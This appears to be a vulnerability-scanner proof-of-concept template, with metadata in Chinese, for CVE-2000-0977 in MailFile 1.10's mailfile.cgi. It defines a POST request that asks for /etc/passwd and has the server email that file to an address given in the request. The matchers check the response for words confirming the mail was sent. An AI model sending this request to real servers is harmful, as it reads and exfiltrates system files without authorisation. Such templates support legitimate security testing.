[info]
author = "ave"
description = "通过 POST 请求向 mailfile.cgi 的 filename 参数传入目标文件路径（如 /etc/passwd），服务器将文件内容通过邮件发送至 email 参数指定地址，验证任意文件读取漏洞"
id = "POC-AVE-2000-0713"
name = "MailFile 1.10 mailfile.cgi 任意文件读取 PoC"
severity = "medium"
tags = ["ave-2000-0713"]
vuln_id = [
    "CVE-2000-0977",
    "AVE-2000-0713",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/mailfile.cgi"
protocol = "http"

[poc.requests.body]
content = "filename=/etc/passwd&email=test@test.com"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "mailfile",
    "sent",
    "email",
]
